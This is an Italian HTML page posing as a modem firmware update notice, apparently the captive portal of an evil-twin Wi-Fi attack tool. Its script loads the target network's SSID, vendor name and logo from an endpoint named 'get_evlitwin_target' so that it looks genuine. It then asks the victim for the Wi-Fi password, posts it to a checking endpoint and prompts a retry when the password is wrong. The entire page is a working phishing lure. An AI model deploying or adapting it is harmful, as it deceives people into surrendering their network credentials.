<!DOCTYPE html>
<html lang="it">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aggiornamento Modem</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-color: #f4f4f9;
            color: #333;
        }

        .container {
            text-align: center;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background: #fff;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
        }

        img.logo_large {
            width: 280px;
            margin-bottom: 15px;
            margin-top: 8px;
        }

        img.logo_small {
            width: 100px;
            margin-bottom: 20px;
        }

        img.disabled {
            display: none;
        }

        h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }

        p {
            margin-bottom: 20px;
            font-size: 1rem;
        }

        .wifi-name {
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 1rem;
            text-align: left;
        }

        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 20px;
            font-size: 1rem;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .button-group {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        button {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #0056b3;
        }

        button.cancel {
            background-color: #dc3545;
        }

        button.cancel:hover {
            background-color: #c82333;
        }

        footer {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #666;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 1.2rem;
            }

            p {
                font-size: 0.9rem;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <img id="logo" class="disabled" src="" alt="Logo Modem">
        <h1>Aggiornamento Modem</h1>
        <p>Per garantire il corretto funzionamento della rete, si consiglia di aggiornare il modem. Se l'aggiornamento
            non viene completato, la rete potrebbe risultare instabile.</p>
        <div class="wifi-name" id="wifiName"></div>
        <input type="password" id="wifiPassword" placeholder="Password Wi-Fi">
        <div class="button-group">
            <button onclick="submitPassword()">Conferma</button>
            <button class="cancel" onclick="window.location.href='loader.html';">Annulla</button>
        </div>
        <footer>
            <p id="vendor"></p>
        </footer>
    </div>
    <script>
        async function submitPassword() {
            const password = document.getElementById('wifiPassword').value;
            if (password) {
                try {
                    const bodyData = `password=${password}`;
                    const response = await fetch('/api/check_input_password', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        body: bodyData
                    });
                    const responseText = await response.text();
                    if (response.ok) {
                        if (responseText === "bad") {
                            alert("Password errata. Riprova.");
                        } else {
                            alert("Password accettata. Aggiornamento in corso...");
                        }
                    } else {
                        alert("Errore durante l'aggiornamento. Riprova.");
                    }
                } catch (error) {
                    alert("Si è verificato un errore durante l'invio della richiesta.");
                }
            } else {
                alert("Inserisci la password per continuare.");
            }
        }

        async function loadTargetInfo() {
            try {
                const res = await fetch('/api/get_evlitwin_target', { cache: 'no-store' });
                if (!res.ok) throw new Error(`HTTP ${res.status}`);

                const data = await res.json();
                document.getElementById('wifiName').textContent = `${data.ssid}:`;

                const vendorEl = document.getElementById('vendor');
                if (!data.vendor || data.vendor === "Generic") {
                    vendorEl?.remove();
                } else {
                    vendorEl.textContent = `© ${data.vendor} 2024, All Rights Reserved.`;
                }

                const logoEl = document.getElementById('logo');
                const testImage = new Image();

                testImage.onload = function () {
                    logoEl.src = data.logo;
                    logoEl.classList.remove('disabled');

                    if (testImage.width === 100 && testImage.height === 100) {
                        logoEl.classList.add('logo_small');
                        logoEl.classList.remove('logo_large');
                    } else {
                        logoEl.classList.add('logo_large');
                        logoEl.classList.remove('logo_small');
                    }
                };

                testImage.onerror = function () {
                    logoEl.classList.add('disabled');
                };

                testImage.src = data.logo;
            } catch (e) {
                console.error('Errore caricamento target:', e);
                document.getElementById('wifiName').textContent = 'Rete: (non disponibile)';
            }
        }
        window.addEventListener('DOMContentLoaded', loadTargetInfo);
    </script>
</body>

</html>
